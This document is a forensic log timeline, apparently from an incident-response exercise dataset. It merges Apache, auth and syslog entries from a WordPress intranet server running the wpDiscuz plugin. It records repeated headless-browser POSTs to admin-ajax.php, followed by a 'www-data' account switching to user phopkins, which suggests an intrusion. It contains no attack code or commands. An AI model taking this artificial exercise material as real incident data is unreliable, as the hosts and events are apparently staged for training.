01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.wof...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 18908; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11687; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1702; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1120; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:37,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35....,http_request: GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4069; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5618; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:35,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35....,http_request: GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4069; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:35,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:48,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:48,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5576; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5587; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5620; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:02,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:02,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5647; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:03,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:52,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5720; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:53,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:13,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:13,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5724; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:39,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.116,http_request: GET / HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:41,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:41,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5443; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:09:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28722] pam_unix(cron:session): session closed for user root,[CRON  pid: 28722] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:09:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28722] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28722] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:09:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/syst...,Cron ran: [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi for user: root pid: 28723,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:23,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting Clean php session files...,[systemd  pid: 1] Starting Clean php session files...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:24,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Clean php session files.,[systemd  pid: 1] Started Clean php session files.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:45,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-timesyncd  pid: 4706] Network configuration changed  trying to estab...,[systemd-timesyncd  pid: 4706] Network configuration changed  trying to establish connection.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:45,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-networkd  pid: 4690] ens3: Configured,[systemd-networkd  pid: 4690] ens3: Configured,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:46,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-timesyncd  pid: 4706] Synchronized to time server 91.189.91.157:123 ...,[systemd-timesyncd  pid: 4706] Synchronized to time server 91.189.91.157:123 (ntp.ubuntu.com).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:04:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.144,http_request: GET / HTTP/1.1 from: 10.35.33.144 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:28,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1489; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23189; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 17...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11600; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from...,http_request: GET /wp-includes/css/dist/block-library/style.min.css?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 10846; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 172...,http_request: GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4505; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 172.17.130.196,http_request: GET /wp-includes/js/jquery/jquery.min.js?ver=3.6.0 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 31246; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1099; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.1...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:31,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /favicon.ico HTTP/1.1 from: 172.17.130.196,http_request: GET /favicon.ico HTTP/1.1 from: 172.17.130.196 code: 404 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 396; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:36,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] Successful su for phopkins by www-data,[su  pid: 28816] Successful su for phopkins by www-data,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[su  pid: 28816] + /dev/pts/1 www-data:phopkins,[su  pid: 28816] + /dev/pts/1 www-data:phopkins,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by...,[systemd] pam_unix(systemd-user:session): session opened for user phopkins by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Created slice User Slice of phopkins.,[systemd  pid: 1] Created slice User Slice of phopkins.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:14:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-logind  pid: 1011] New session c1 of user phopkins.,[systemd-logind  pid: 1011] New session c1 of user phopkins.,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
